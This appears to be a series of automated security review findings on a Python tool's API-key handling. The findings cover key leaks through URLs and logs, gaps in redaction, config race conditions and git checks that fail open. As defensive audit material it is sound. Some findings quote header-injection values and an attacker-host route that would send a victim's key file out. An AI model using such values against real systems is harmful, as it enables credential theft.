chunk_findings.detail: The Gemini path still puts the key into the URL query string (`f"?key={urllib.parse.quote(key)}"`). The key is now allowed to come from `api_key_file`, but this URL form means the key appears in `_post_json` debug logs, proxy/server access logs, and any `URLError`/`HTTPError` message that echoes the URL. The added `review_keys.scrub(err, key)` only receives the raw key and cannot redact its percent-encoded URL form or logs emitted before the error is returned; a key such as `A B?C&` becomes `A%20B%3FC%26` in the URL and leaks into the review record on a network error.
chunk_findings.title: ddflow/services/review.py: _chat_gemini

chunk_findings.detail: `rev.key_result("ANTHROPIC_API_KEY")` and `rev.key_result("GEMINI_API_KEY")` make the reviewer fall back to the standard ambient environment variable when `api_key_env` is empty. Previously `rev.api_key()` returned empty in that case, and the review stopped with "no API key". Now an unconfigured reviewer will silently pick up `ANTHROPIC_API_KEY`/`GEMINI_API_KEY` from the process environment and send it to `rev.base_url`; with a custom or shared lane endpoint, this exfiltrates an ambient credential the reviewer never explicitly opted into.
chunk_findings.title: ddflow/services/review.py: _chat_anthropic, _chat_gemini

chunk_findings.detail: The secret is hidden only from `repr()`; `field(repr=False)` does not affect `dataclasses.asdict()`, `vars()`, or other serialization. For example, `dataclasses.asdict(KeyResult(value="sk-secret"))` returns `{'value': 'sk-secret', 'reason': '', 'source': ''}`. Since `review.py` now carries a `key_result` value, any review record that is serialized as a dataclass/dict will persist or log the plaintext API key. Repr-only protection is insufficient for a value that can be embedded in review records.
chunk_findings.title: ddflow/services/review_keys.py KeyResult

chunk_findings.detail: `read_key_file` rejects only `str.isspace()` characters, so a NUL byte (`\x00`) is accepted as part of the key. On Linux, `/proc/self/environ` reports as a regular file owned by the current user with no group/other permission bits, so `_refusal` passes and `os.read` returns NUL-separated process environment data. If the environment is under 16 KiB and contains no space characters, `read_key_file("/proc/self/environ")` returns the process environment as the API key value, which can then be sent to the model service or logged; the doc says this is a key file, but it is now a channel that turns arbitrary NUL-separated secrets into a bearer value.
chunk_findings.title: ddflow/services/review_keys.py:83

chunk_findings.detail: The key file descriptor is opened without `O_CLOEXEC`. Between `os.open` and `os.close`, a concurrently forked/executed child (for example via `os.system` or a subprocess created with `close_fds=False`) inherits the still-open secret file descriptor and can read/exfiltrate the key. The descriptor should be opened with `os.O_CLOEXEC` (or the same `getattr` fallback pattern) because this code handles a secret.
chunk_findings.title: ddflow/services/review_keys.py:64

chunk_findings.detail: This test asserts the Gemini request URL contains the raw key (`f"key={FAKE}" in seen["url"]`). Putting the secret in the URL query string means proxies, load balancers, access logs, and error pages that record `req.full_url` get the key. For a file-based API key, the transport should use the `x-goog-api-key` header, or the URL must be scrubbed before any logging/error propagation.
chunk_findings.title: tests/test_review_key_file.py:174 test_gemini_reads_the_file

chunk_findings.detail: `EP.launch_env(ep)` is asserted to return `{ENV: ENV}`. Given an endpoint with `api_key_env=ENV` and parent environment `DDFLOW_TEST_KEY_FILE_VAR=sk-...`, a normal subprocess launcher that merges this dict sets the child’s `DDFLOW_TEST_KEY_FILE_VAR` to the literal string `"DDFLOW_TEST_KEY_FILE_VAR"`, not the real key. That makes env-first lane auth fail, and it is not “names only” in a runtime environment; the launcher would need the current value or no override at all.

chunk_findings.detail: Previous finding #7 still holds at this line: `launch_env` returns `{ep.api_key_env: ep.api_key_env}`. For an endpoint with `api_key_env="DDFLOW_API_KEY"` and parent environment `DDFLOW_API_KEY= [REDACTED] this produces `{"DDFLOW_API_KEY": "DDFLOW_API_KEY"}`. A subprocess launcher that merges this dict as child environment overrides will pass the literal source name `"DDFLOW_API_KEY"`, not `"sk-secret"`, so env-first lane auth fails. The new `resolve_key` helper does not answer the finding because `launch_env` never calls it and no wiring in this diff puts the resolved value into the child environment; the helper’s own docstring claims the value goes to the child environment, but the code that actually builds the launch environment still emits only the source name.
chunk_findings.title: ddflow/services/lanes/endpoint.py:launch_env

chunk_findings.detail: The patch routes `HTTPError` and `URLError` messages through `review_keys.scrub(..., key)`, but this `ValueError` branch is left unscubbed. If `key` contains a carriage return (for example an API key env var value of `sk-\rX: y`; Unix env strings may contain CR), the new `Authorization: Bearer {key}` header causes `http.client.putheader` inside `_open` to raise `ValueError: Invalid header value: ('Bearer sk-\\rX: y',)`. That exception is caught here and returned via `_cut_off(exc)` without redaction, exposing the full API key to the caller.
chunk_findings.title: ddflow/services/review.py:except (ValueError, json.JSONDecodeError)

chunk_findings.detail: The previous `KeyResult` plaintext-leak problem still stands in a new form: the class is no longer a dataclass and `__reduce__` raises, but `vars(KeyResult(value="sk-secret"))` returns `{'_value': 'sk-secret', 'reason': '', 'source': ''}`. The class docstring claims “Only `.value` does; `repr`, `str` and pickling name the source alone,” but that is false for `vars()` (and Python 3.11+ `__getstate__()` on slots). Any review-record serializer or logger that uses `vars`/`__getstate__` on a record containing `key_result` will persist/log the raw key, so the key value is not actually confined to `.value`.
chunk_findings.title: ddflow/services/review_keys.py:KeyResult

chunk_findings.detail: The call to `review_keys.refuse_shared_key_files` occurs after the reviewer configuration has already been loaded into `Reviewer` objects (the preceding `lenient=not _is_code_tree(root),` argument list has closed just above this line). The function is given `tomlcfg.config_paths(root, "reviewers.toml")`, so it must re-open and parse the same `reviewers.toml` to discover `api_key_file` entries. This is a TOCTOU defect: an attacker who can swap or edit the config file between the initial parse and this check can make the initial parse record one `api_key_file` (which later `resolve_key` will read in `_chat_anthropic`/`_chat_gemini`) while this permission/symlink check validates a different path from the second parse. The key file ultimately used is therefore not guaranteed to have been refused as shared or symlinked.
chunk_findings.title: ddflow/services/review.py:428

chunk_findings.detail: The diff adds calls to `review_keys.scrub(...)` in the `urllib.error.HTTPError` and `(urllib.error.URLError, OSError)` handlers, but the visible change to `review.py` does not add an import for `review_keys`. Since `review_keys.py` is newly added in this change, there is no pre-existing import in `review.py`. Given any non-2xx endpoint response, the `HTTPError` handler evaluates `review_keys.scrub`, causing `NameError: name 'review_keys' is not defined` instead of returning the intended scrubbed error string. The original HTTP error is lost and the call now raises, breaking the contract that this function returns `(text, error)`.
chunk_findings.title: ddflow/services/review.py:1071 (`review_keys.scrub` in exception handlers)

chunk_findings.detail: The environment branch returns `KeyResult(value=val, source="env")` without the single-printable-word check that `read_key_file` applies to files. Given `GEMINI_API_KEY` set to `"sk-live\nX-Injected: yes"`, `resolve_key` returns that string as a valid key, and this change puts the value in the `x-goog-api-key` header. This bypasses the stated printable-only requirement and can emit an invalid or injected header instead of refusing the value.
chunk_findings.title: ddflow/services/review_keys.py:resolve_key

chunk_findings.detail: `scrub` only builds `{key, quote(key), quote(key, safe="")}`, and `urllib.parse.quote` emits uppercase percent hex, e.g. `abc%2Fdef`. A server echo that percent-encodes the same key with lowercase hex (`abc%2fdef`) is not replaced, so a key containing `/`, `%`, non-ASCII, etc. can still leak into logged/echoed text. The contract says the URL-quoted form is redacted, but URL percent-encoding is case-insensitive.
chunk_findings.title: ddflow/services/review_keys.py:scrub

chunk_findings.detail: `data.decode("utf-8", "replace")` turns invalid UTF-8 bytes into U+FFFD, and `"\ufffd".isprintable()` is `True`. A 0600 file containing `b"\xff"` is therefore accepted as `KeyResult(value="\ufffd", source="file")` even though it is not a valid UTF-8/printable key. The function should decode with strict errors or explicitly reject U+FFFD, otherwise non-key binary data becomes a fake key instead of a refusal.
chunk_findings.title: ddflow/services/review_keys.py:read_key_file

chunk_findings.detail: The check trusts any file whose resolved parent is `.ddflow/local/` (`if not p.is_file() or p.resolve().parent == local: continue`), but a config force-added with `git add -f .ddflow/local/reviewers.toml` is still committed/shared and still contains `api_key_file`; this function raises no `ValueError`. This evades the stated rule that only git-ignored `.ddflow/local/` files may set `api_key_file`, leaving the committed-config attack open.
chunk_findings.title: ddflow/services/review_keys.py:refuse_shared_key_files

chunk_findings.detail: Previous finding #3 still holds. `KeyResult` stores the raw secret in the `_value` slot; `vars(KeyResult(value="sk-secret"))` returns `{'_value': 'sk-secret', 'reason': '', 'source': ''}`. The updated docstring now acknowledges that `vars`/`__slots__` can still reach it, but that is not a guard: any serializer/logger that introspects a record containing a `KeyResult` (for example `logging.debug("%s", vars(record))`) still reads the API key, so the plaintext leak remains.
chunk_findings.title: ddflow/services/review_keys.py:KeyResult

chunk_findings.detail: `status` does not perform the same validation as `resolve_key`: given `os.environ["DDFLOW_API_KEY"] = " "` (one space) and a valid key file, `resolve_key` returns a refusal, but `status("DDFLOW_API_KEY", "/valid/key_file")` returns `"env $DDFLOW_API_KEY"`. `key_hints` only reports statuses starting with `"missing"` or `"UNAVAILABLE"`, so this reviewer is omitted from the hints and appears configured even though all requests will fail.
chunk_findings.title: ddflow/services/review_keys.py:status

chunk_findings.detail: `read_key_file` is documented “Never raises,” but a path containing a NUL byte (TOML `api_key_file = "\u0000"` can produce this) makes `os.open` raise `ValueError`, which is not caught by `except FileNotFoundError`/`except OSError`. `resolve_key` and `status` then propagate the exception instead of returning a `KeyResult`, violating the contract and crashing review setup.
chunk_findings.title: ddflow/services/review_keys.py:read_key_file

chunk_findings.detail: Previous finding #3 still holds: the new `test_key_result_is_not_serialisable_to_a_dict` only checks `dataclasses.is_dataclass(got)` and that `pickle.dumps(got)` raises; it never exercises `vars(got)` or `got.__getstate__()`. A concrete leak remains: `vars(RK.resolve_key("", str(_keyfile(tmp_path))))` returns a dict containing `_value` with the plaintext key, so any review-record serializer or logger that uses `vars()`/`__getstate__` exposes the key, while the pickle probe still passes.
chunk_findings.title: ddflow/services/review_keys.py:KeyResult

chunk_findings.detail: The `review_keys.refuse_shared_key_files` check still runs after `Reviewer` objects have already been built from `reviewers.toml`, and it is given `tomlcfg.config_paths(...)` rather than the parsed config data, so it must open the file a second time. An attacker can race the two reads: the first read loads a shared/committed `reviewers.toml` containing `api_key_file` into the in-memory reviewers, then the file is swapped for a clean copy; the check at line 428 sees the clean copy and returns without raising, but the already-built `Reviewer` objects keep the attacker-chosen key path and later send that key to the model endpoint. This is the same TOCTOU from the previous finding and is not fixed by the current call placement.
chunk_findings.title: ddflow/services/review.py:428

chunk_findings.detail: The guard `if rev.api_key_file and not got.value:` suppresses a `key_result()` refusal unless an `api_key_file` is also configured. For a reviewer with no `api_key_file`, an invalid environment key such as `"sk-live\nX-Injected: yes"` is supposed to be refused by `review_keys.resolve_key`, yielding a falsy `got.value` and a non-empty `got.reason`. Because `rev.api_key_file` is false, this code skips `return "", got.reason`, sets `key` to the falsy value, omits Authorization, and sends the request without reporting the real failure. That violates the intended env-control-chars refusal; the refusal only works when a file is also configured. The guard should apply when `not got.value` (and a reason is present), not only when `rev.api_key_file` is set.
chunk_findings.title: ddflow/services/review.py:1066

chunk_findings.detail: The local check is `if not p.is_file() or p.resolve().parent == local: continue`, so it treats any path that resolves into `.ddflow/local/` as machine-local and never checks whether that file is git-ignored. A `.ddflow/local/reviewers.toml` containing `api_key_file` added with `git add -f` is therefore accepted without raising `ValueError`, and a committed symlink whose target resolves into `.ddflow/local/` passes too. That evades the stated rule that only git-ignored `.ddflow/local/` files may set `api_key_file`.
chunk_findings.title: ddflow/services/review_keys.py:refuse_shared_key_files

chunk_findings.detail: The function still re-opens and reparses each `reviewers.toml` with `read_toml(p)` instead of validating the already loaded configuration structure. As called from `review.py` after the `Reviewer` objects have already been constructed, this is a TOCTOU window: an attacker who swaps or edits the config between the initial parse and this second parse can make the loaded objects contain `api_key_file` while this validation read sees the clean version and raises nothing, so the unvalidated config is then used.
chunk_findings.title: ddflow/services/review_keys.py:refuse_shared_key_files

chunk_findings.detail: The new test `test_local_reviewers_file_accepts_api_key_file` (tests/test_review_key_file.py:228) accepts `.ddflow/local/reviewers.toml` in a bare tmp_path with no `.git` or `.gitignore`. Because this test passes, `refuse_shared_key_files` still gates only on the resolved parent being `.ddflow/local/`, not on the file actually being git-ignored. A config committed with `git add -f .ddflow/local/reviewers.toml` containing `api_key_file` is therefore still accepted as machine-local even though it is shared, so the machine-local-only policy is still bypassed (previous finding 6).
chunk_findings.title: ddflow/services/review_keys.py:refuse_shared_key_files

chunk_findings.detail: `test_missing_and_unreadable_file_are_unavailable` chmods `k.key` to 0o000 and asserts it is refused. If pytest runs as root (common in containers), root bypasses POSIX permission bits and the file is still readable; `RK.resolve_key` returns `FAKE`, so `assert not got.value` fails. The test assumes non-root permission enforcement and will be a false failure in that environment.
chunk_findings.title: tests/test_review_key_file.py:90

Since the diff introduces key-aware sanitization here, leaving this remote-controlled exception path unsanitized leaks the key.

chunk_findings.detail: `_tracked` passes `str(path)` to `git ls-files`, but `git ls-files` expects paths relative to the repository root. When `root` is absolute and `paths` contains the absolute path of a tracked, force-added file such as `/repo/.ddflow/local/reviewers.toml`, the `git ls-files --error-unmatch -- /repo/.ddflow/local/reviewers.toml` command fails (returncode != 0), so `_tracked` returns `False`. In `refuse_shared_key_files`, the condition `p.resolve().parent == local and not _tracked(root, p)` is then true (parent is the local dir, tracked is false), causing `continue` instead of raising `ValueError`. This permits a committed/shared config inside `.ddflow/local/` to set `api_key_file`, bypassing the machine-local-only rule and the protection against shared key paths.

chunk_findings.detail: `refuse_shared_key_files` calls `_tracked(root, p)` on the unresolved alias path. If `.ddflow/local` is a symlink to `actual_local/`, and `actual_local/reviewers.toml` is tracked with an `api_key_file` entry, `p` is `.ddflow/local/reviewers.toml`. `p.resolve().parent == local` is true (because `local` also resolves to `actual_local`), but `git ls-files --error-unmatch -- .ddflow/local/reviewers.toml` returns non-zero: Git tracks `.ddflow/local` as a symlink, not as a file beneath it. `_tracked` therefore returns `False`, the function executes `continue`, and no `ValueError` is raised. The tracked/shared config is accepted via the symlink, defeating the machine-local-only guard. chunk_findings.detail: `Endpoint` now accepts `api_key_file` from `cat.route[route]` and `resolve_key(ep)` reads it, but this path has no `review_keys.refuse_shared_key_files` / machine-local / git-ignored check on the route config that supplied the path. A non-local route entry such as `endpoint.v = { url = "https://attacker.invalid/", api_key_file = "[REDACTED:path]" }` makes `_key_file()` return the victim's key path, and `resolve_key(ep)` then reads that file and uses it as the endpoint key. Shared/committed route definitions do not satisfy the `.ddflow/local/` machine-local-only restriction intended for `api_key_file`, so this bypasses the guard added for reviewer keys and can leak the victim's local secret to the configured endpoint URL.
chunk_findings.title: ddflow/services/lanes/endpoint.py:_key_file, resolve_key

chunk_findings.detail: The HTTPError redaction is applied after truncating the response body with `exc.read()[:300]`, so `review_keys.scrub` never sees the full secret. For example, with `key = "k" * 400` and an upstream HTTP 401 body `b"bad key: " + key`, the fragment passed to `scrub` is only the first 300 bytes (`b"bad key: "` plus 291 `k` bytes); the full 400-byte key does not appear in that string, so a whole-key replacement cannot redact it, and the returned error leaks the first 291 bytes of the credential.
chunk_findings.title: ddflow/services/review.py:1082

chunk_findings.detail: Previous #3 still holds: line 213 only skips when `p.resolve().parent == local and not _tracked(root, p.resolve())`; it never checks that the local file is git-ignored, and it resolves the path before asking git. An untracked `.ddflow/local/reviewers.toml` that is not listed in `.gitignore` is therefore accepted. A committed symlink at e.g. `/repo/reviewers.toml` pointing to an untracked `.ddflow/local/reviewers.toml` also passes, because `_tracked` receives the target path and returns False. The new `test_a_force_added_local_file_is_treated_as_shared` probe only covers a tracked regular local file and does not answer either case.
chunk_findings.title: ddflow/services/review_keys.py:213

chunk_findings.detail: `_tracked` converts every failure of the Git subprocess into `False`: missing `git` (`OSError`), a nonzero exit such as Git's "dubious ownership" refusal when `/repo` is owned by a different uid, or the 10s timeout. Since `refuse_shared_key_files` treats `False` as "not tracked, so local and accepted," the check fails open. For example, a tracked `/repo/.ddflow/local/reviewers.toml` with `api_key_file` is accepted when ddflow runs as uid 1001 in a repo owned by uid 1000; git exits 128, `_tracked` returns False, and the committed key path is used instead of raising. Git attestation must fail closed.
chunk_findings.title: ddflow/services/review_keys.py:_tracked:195

chunk_findings.detail: Previous finding #5 still holds. `test_local_reviewers_file_accepts_api_key_file` still expects `RV.load_reviewers` to accept `.ddflow/local/reviewers.toml` containing `api_key_file` in a bare `tmp_path` with no `.git` or `.gitignore`; the newly added `test_a_force_added_local_file_is_treated_as_shared` only checks a tracked local file. That means `refuse_shared_key_files` is still not enforcing the rule that only *git-ignored* `.ddflow/local/` files may contain `api_key_file`. In a git repo where `.ddflow/local/` is not ignored, an untracked `.ddflow/local/reviewers.toml` with `api_key_file` is accepted on load, and a later plain `git add .` commits the real key without `-f`; the key is then already in Git history before `load_reviewers` ever refuses the tracked file.
